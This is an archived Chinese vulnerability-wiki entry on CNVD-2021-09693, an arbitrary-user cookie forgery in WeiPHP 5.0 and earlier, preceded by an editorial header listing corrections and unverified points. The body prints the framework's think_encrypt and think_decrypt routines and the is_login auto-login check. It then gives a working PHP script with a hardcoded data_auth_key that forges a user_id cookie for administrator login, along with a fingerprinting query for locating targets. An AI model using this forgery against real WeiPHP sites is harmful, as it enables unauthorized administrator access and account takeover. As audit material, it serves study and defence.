---
source: "Threekiii/Awesome-POC"
cnvd: "CNVD-2021-09693"
identifier_role: "primary"
primary_identifiers: "CNVD-2021-09693"
referenced_identifiers: ""
identifier_status: "unknown"
title: "WeiPHP5.0 任意用户Cookie伪造 CNVD-2021-09693"
product: "WeiPHP Web应用"
record_type: "vulnerability"
document_type: "源码审计与条件攻击链"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
prerequisites: "文中<=5.0；首先必须通过另一个文件读取漏洞或其他方式取得data_auth_key；目标用户ID需有效"
side_effects: "原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E6%A1%8C%E9%9D%A2%E8%BD%AF%E4%BB%B6/WeiPHP5.0/WeiPHP5.0%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7Cookie%E4%BC%AA%E9%80%A0%20CNVD-2021-09693.md"
archive_commit: "41940cb0038d09ca5aaddbe5bffb923e423d210f"
source_status: "missing"
source_note: "原始出处待补；仓库归档不等同原始披露"
version_unverified: "Weiphp <= 5.0"
id: "vw-bb02eeeb714a37905d08d2aa"
entity_id: "ve-b03d9433daff0c8fc52fb892"
schema_version: "1"
canonical: "Web安全/开发框架/WeiPHP/WeiPHP5.0-任意用户Cookie伪造-CNVD-2021-09693.md"
relation_type: "duplicate_of"
---

# WeiPHP5.0 任意用户Cookie伪造 CNVD-2021-09693

<!-- vulwiki-editorial-rebuild:system-misc -->
## 条目范围与校订

- 本文对象：WeiPHP Web应用
- 文献类型：源码审计与条件攻击链
- 版本、权限及部署边界：文中<=5.0；首先必须通过另一个文件读取漏洞或其他方式取得data_auth_key；目标用户ID需有效
- 核验状态：仅重建文本校订；未执行文中代码、PoC 或扫描，未把截图或转载声明记为本站复现

### 具体结论与待核项

以下为原归档的逐项勘误与证据缺口；可由文本确定的问题已在下文订正，仍缺来源的事实保持待核。

1. 误归桌面软件；核心前提是密钥泄露，不是无条件任意用户伪造
2. 上一篇任意文件读取未提供链接或编号，需建立独立漏洞与攻击链关系
3. user_Id=1与Cookie user_id大小写混淆；文字称解密密钥错误，实际用密钥解密UID
4. 示例硬编码密钥须标注实验值，不能误作跨安装通用密钥；uid1管理员身份需验证
5. 提供完整加解密与登录路径有价值，但缺修复版本、官方编号来源和请求响应文字，截图未视检

### 操作风险

原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响

技术请求、代码与实验方法按原文保留；其中的破坏性动作仅限授权、可恢复的隔离环境。缺失代码、参数或版本事实不猜补。

### 来源追溯

- 原文参考链接（未重新核验）：<https://www.weiphp.cn/doc/Initialization_database.html>
- 原始披露 URL 未确认；既有归档来源标签保留，不能替代原始公告

### 归档技术正文

## 漏洞描述

Weiphp5.0 存在管理员用户Cookie伪造，通过泄露的密钥数据，可利用加密方法来得到管理员的Cookie

## 漏洞影响

```
Weiphp <= 5.0
```

## 环境搭建

[weiphp5.0官方下载参考手册](https://www.weiphp.cn/doc/Initialization_database.html)

参考官方手册创建网站即可

![](./.resource/WeiPHP5.0任意用户Cookie伪造CNVD-2021-09693/media/202202162320938.png)


## 网络测绘

app="WeiPHP"

## 漏洞复现

首先需要得到数据库配置文件中的**data_auth_key**密钥

![](./.resource/WeiPHP5.0任意用户Cookie伪造CNVD-2021-09693/media/202202162320455.png)

得到这个配置文件可参照上一篇**Weiphp5.0 前台文件任意读取**

```plain
'data_auth_key' => '+0SeoAC#YR,Jm&c?[PhUg9u;:Drd8Fj4q|XOkx*T'
```

全局查找下使用了这个密钥的地方

![](./.resource/WeiPHP5.0任意用户Cookie伪造CNVD-2021-09693/media/202202162320938.png)

找到了跟据这个密钥的加密方法和解密方法

**加密方法 think_encrypt**

```php
function think_encrypt($data, $key = '', $expire = 0)
{
    $key = md5(empty($key) ? config('database.data_auth_key') : $key);

    $data = base64_encode($data);
    $x = 0;
    $len = strlen($data);
    $l = strlen($key);
    $char = '';

    for ($i = 0; $i < $len; $i++) {
        if ($x == $l) {
            $x = 0;
        }

        $char .= substr($key, $x, 1);
        $x++;
    }

    $str = sprintf('%010d', $expire ? $expire + time() : 0);

    for ($i = 0; $i < $len; $i++) {
        $str .= chr(ord(substr($data, $i, 1)) + (ord(substr($char, $i, 1))) % 256);
    }
    return str_replace(array(
        '+',
        '/',
        '='
    ), array(
        '-',
        '_',
        ''
    ), base64_encode($str));
}
```

**解密方法 think_decrypt**

```php
function think_decrypt($data, $key = '')
{
    $key = md5(empty($key) ? config('database.data_auth_key') : $key);
    $data = str_replace(array(
        '-',
        '_'
    ), array(
        '+',
        '/'
    ), $data);
    $mod4 = strlen($data) % 4;
    if ($mod4) {
        $data .= substr('====', $mod4);
    }
    $data = base64_decode($data);
    $expire = substr($data, 0, 10);
    $data = substr($data, 10);

    if ($expire > 0 && $expire < time()) {
        return '';
    }
    $x = 0;
    $len = strlen($data);
    $l = strlen($key);
    $char = $str = '';

    for ($i = 0; $i < $len; $i++) {
        if ($x == $l) {
            $x = 0;
        }

        $char .= substr($key, $x, 1);
        $x++;
    }

    for ($i = 0; $i < $len; $i++) {
        if (ord(substr($data, $i, 1)) < ord(substr($char, $i, 1))) {
            $str .= chr((ord(substr($data, $i, 1)) + 256) - ord(substr($char, $i, 1)));
        } else {
            $str .= chr(ord(substr($data, $i, 1)) - ord(substr($char, $i, 1)));
        }
    }
    return base64_decode($str);
}
```

全局查看下使用了解密方法的地方

在文件 **application\common.php** 中含有使用解密方法的代码，用于做身份验证

```php
function is_login()
{
    $user = session('user_auth');
    if (empty($user)) {
        $cookie_uid = cookie('user_id');
        if (!empty($cookie_uid)) {
            $uid = think_decrypt($cookie_uid);
            $userinfo = getUserInfo($uid);
            D('common/User')->autoLogin($userinfo);

            $user = session('user_auth');
        }
    }
    if (empty($user)) {
        return 0;
    } else {
        return session('user_auth_sign') == data_auth_sign($user) ? $user['uid'] : 0;
    }
}
```

根据这里得到的代码，可以知道当**user_Id=1**时,会解密密钥后判断是否正确，如果正确则可以登录系统

我们在本地使用加密代码加密**user_id=1**得到的cookie则可以登录系统

```php
<?php
show_source(__FILE__);
function think_encrypt($data, $key = '', $expire = 0)
{
    $key = '+0SeoAC#YR,Jm&c?[PhUg9u;:Drd8Fj4q|XOkx*T';
    $key = md5($key);

    $data = base64_encode($data);
    $x = 0;
    $len = strlen($data);
    $l = strlen($key);
    $char = '';

    for ($i = 0; $i < $len; $i++) {
        if ($x == $l) {
            $x = 0;
        }

        $char .= substr($key, $x, 1);
        $x++;
    }

    $str = sprintf('%010d', $expire ? $expire + time() : 0);

    for ($i = 0; $i < $len; $i++) {
        $str .= chr(ord(substr($data, $i, 1)) + (ord(substr($char, $i, 1))) % 256);
    }
    return str_replace(array(
        '+',
        '/',
        '='
    ), array(
        '-',
        '_',
        ''
    ), base64_encode($str));
}

echo 'user_id = ' . think_encrypt($_GET['user_id']);
?>
```

![](./.resource/WeiPHP5.0任意用户Cookie伪造CNVD-2021-09693/media/202202162320334.png)

添加**cookie: user_id=xxxxxxxx**即可成功登录

![](./.resource/WeiPHP5.0任意用户Cookie伪造CNVD-2021-09693/media/202202162320956.png)


![](./.resource/WeiPHP5.0任意用户Cookie伪造CNVD-2021-09693/media/202202162321696.png)


- 获取密钥的方法参照上一篇审计文章


---

> 来源：Threekiii/Awesome-POC
